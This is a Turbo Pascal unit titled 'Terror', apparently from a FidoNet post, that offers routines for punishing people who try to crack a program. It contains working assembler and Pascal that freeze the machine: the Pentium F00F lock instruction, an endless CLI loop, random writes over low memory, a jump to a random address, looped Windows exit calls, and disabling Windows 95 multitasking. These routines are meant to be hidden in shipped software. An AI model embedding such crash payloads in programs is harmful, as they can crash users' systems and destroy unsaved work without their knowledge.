unit Terror;
{ Description:
    Programmers terror unit! Be mean to people who tries to crack
    your program!  Lot's of funny stuff!

  What's the point:
    Adding some of these routines to your program's "failed selfcheck"
    code will make will make lamers afraid of trying to crack your program.
    Any real cracker will just be slightly irritated and mailbomb you
    or something equalent...

  Information:
    Most of these codes don't have much affect in several WindowsNT,
    and Unix/Linux systems. Probably not in OS/2 either.
}

interface

procedure pentiumBug;       { Freezes Pentium and Pentium MMX, any OS }

procedure scrambleSeg0;     { Freezes several windows/dos systems, w95
                              results in several strange errors }
procedure randomJump;       { Jump to random position, normal result in
                              windows is just an unexpected error...
                              This is the lamest code... }
procedure cliLoop;          { Loop CLI. Freezes DOS, Windows95, etc }
procedure windowsExitLoop_2F1606;
                            { Loop Windows exit calls. Causes Windows95
                              to bug out after a few seconds }
procedure windowsCriticalSection_2F1681;
                            { Don't you just hate multitasking? Run this
                              and you disable windows95's multitasking!! }

implementation

{......................................................................}

procedure pentiumBug; assembler; { This bug hangs P5 and P5MMX, any OS! }
asm
 db $F0,$0F,$C7,$C8
end;

procedure scrambleSeg0; { Kicks DOS and Windows95 }
var w : word;
begin
 for w := 0 to 500 do
  mem[0000:random(65535)] := random(256);
end;

procedure cliLoop; assembler; { Hangs DOS and Windows95 }
asm
 @l:
 cli
 jmp @l
end;

procedure randomJump;
type dw = record
 lw,hw : word;
end;
var d : dw;
begin
 d.lw := random($FFF0);
 d.hw := random($0FFF);
 asm
  mov dx, d.lw
  db 66h; shl dx, 16

  mov dx, d.hw
  db 66h; jmp dx
 end;
end;

procedure windowsExitLoop_2F1606; assembler;
asm
@l:
 mov ax, 1606h
 mov dx, 0
 int 2fh
 jmp @l
end;

procedure windowsCriticalSection_2F1681; assembler;
asm
 mov ax, 1681h
 int 2fh
end;

begin
end.

-!- FMail 1.02
 ! Origin: Server*2GB* D0S.0S2.WiN FiDi.STYX 28k8 0300-13564 (2:203/253)  
